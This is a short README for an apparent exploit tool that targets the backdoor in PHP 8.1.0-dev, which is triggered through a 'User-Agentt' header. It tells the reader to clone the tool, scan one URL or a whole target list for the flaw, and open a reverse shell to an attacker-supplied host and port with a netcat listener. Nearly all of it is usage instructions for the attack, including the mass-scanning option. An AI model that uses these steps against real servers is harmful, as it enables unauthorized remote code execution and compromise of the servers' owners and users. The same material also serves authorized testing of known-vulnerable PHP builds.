# PHP 8.1.0-dev backdoor

PHP verion 8.1.0-dev was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.

## How to install

You can install the exploit with git clone:

```
git clone https://github.com/0xGabe/php-8.1.0-backdoor
```

## How to use

### Check the vuln

The php-exploit at moment has two options, a single URL and a target list, see the commands below for both:

- Single URL

```
python3 php-exploit.py --url https://site.com
```

- Target List

```
python3 php-exploit.py --list target.txt
```

### Get a Reverse Shell

To get a reverse shell you need open another terminal with NC.

```
python3 php-exploit.py --url https://site.com --lhost YOUR-IP --lport YOUR-PORT
```

!()[image-poc.png]
